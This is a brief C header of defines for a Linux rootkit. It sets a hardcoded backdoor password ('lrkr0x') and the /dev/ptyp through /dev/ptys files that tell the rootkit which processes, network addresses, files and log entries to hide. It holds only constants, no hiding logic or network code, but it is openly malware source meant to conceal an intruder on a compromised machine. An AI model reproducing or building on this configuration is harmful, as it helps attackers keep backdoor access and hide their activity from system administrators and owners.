/* LINUX ROOTKIT DEFINES. */

/* ROOTKIT_PASSWORD must be 6 letters due to my lame attempts at string 
   hiding... */

#define ROOTKIT_PASSWORD "lrkr0x"

/* Processes to hide */
#define ROOTKIT_PROCESS_FILE "/dev/ptyp"

/* Addresses to hide */
#define ROOTKIT_ADDRESS_FILE "/dev/ptyq"

/* Files and directories to hide */
#define ROOTKIT_FILES_FILE "/dev/ptyr"

/* Log entries to hide */
#define ROOTKIT_LOG_FILE "/dev/ptys"
